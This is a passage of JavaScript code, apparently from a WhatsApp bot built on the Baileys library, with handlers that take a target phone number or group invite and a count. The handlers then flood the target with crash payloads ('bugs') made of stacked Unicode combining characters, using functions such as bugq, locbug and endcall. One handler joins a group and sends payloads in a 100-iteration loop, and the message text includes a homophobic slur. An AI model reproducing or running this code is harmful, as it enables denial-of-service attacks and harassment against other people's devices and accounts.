...
➻𝑪𝒉𝒆𝒄𝒌 𝑶𝒘𝒏𝒆𝒓 
➻𝑨𝒂𝒂𝒂𝒉 𝑰 𝒇𝒐𝒓𝒈𝒐𝒕 𝑰 𝒔𝒂𝒊𝒅 𝒀𝒐𝒖 𝑪𝒂𝒏𝒕 𝑮𝒆𝒕 😅😅
...
let namaown = `𝑶𝒘𝒏𝒆𝒓 𝒀𝒐𝒖 𝑴𝒆𝒂𝒏?`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.Contributor}:+${global.Contributor}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝕮𝖆𝖑𝖑 𝕸𝖊 𝕾𝖕𝖎𝖉𝖊𝖗 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝕾𝖕𝖎𝖉𝖊𝖗 🥶 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: ryobug })
...
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
hmbug(sendto, `𝕮𝖆𝖑𝖑 𝕸𝖊 𝕾𝖕𝖎𝖉𝖊𝖗̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(5000)
hmbug(sendto, `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝕾𝖕𝖎𝖉𝖊𝖗👿༑${ios1}`)
await sleep(5000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Nomor Target : ${sendto} \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break
...
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 𝕴 𝖘 𝕯𝖔𝖎𝖓𝖌 𝕾𝖔𝖒𝖊 𝕾𝖍𝖎𝖙𝖘 ⿻  𝕯𝖎𝖊 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await bugq(sendto, jumlah,  `💔'҉༑⃟𝕾𝖕𝖎𝖉𝖊𝖗𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
await sleep(1000)
bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await bugq(sendto, jumlah,  `💔'҉༑⃟𝕾𝖕𝖎𝖉𝖊𝖗❤️‍🩹`)
await sleep(1000)
await bugq(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
await sleep(1000)
bugq(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
...
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
await invgp(sendto, jumlah,  `💔'҉༑⃟𝕾𝖕𝖎𝖉𝖊𝖗❤️‍🩹`)
await sleep(1000)
await invgp(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break
...
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
await ordmess(sendto, jumlah,  `💔'҉༑⃟𝕾𝖕𝖎𝖉𝖊𝖗❤️‍🩹`)
await sleep(1000)
await ordmess(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
...
await locbug(gpJid, 50,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await locbug(gpJid, 50,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 target : ${result}`)
...
let gpJid = await ryozingod.groupAcceptInvite(result)
for (let i = 0; i < 100; i++) {
await endcall(gpJid, `𝕾𝖕𝖎𝖉𝖊𝖗 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await locbug(gpJid, 1,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
}
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Group Target : ${gpJid} \n🧪 Jenis Bug : ${command}\n🧪`)
}
break
...
jumlah = q
await invnews(m.chat, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break
...
if (!text) return xgreply(`Example: ${prefix + command} 3`);
jumlah = q
await invgp(m.chat, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻  𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break
...
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    'listMessage': {
        'title': `⟠ 𝕾𝖕𝖎𝖉𝖊𝖗 ⿻ 𝕯𝕺𝕹𝕿 𝕮𝕳𝕬𝕷𝕷𝕰𝕹𝕲𝕰 𝕸𝕰 々${cartbutton}`,
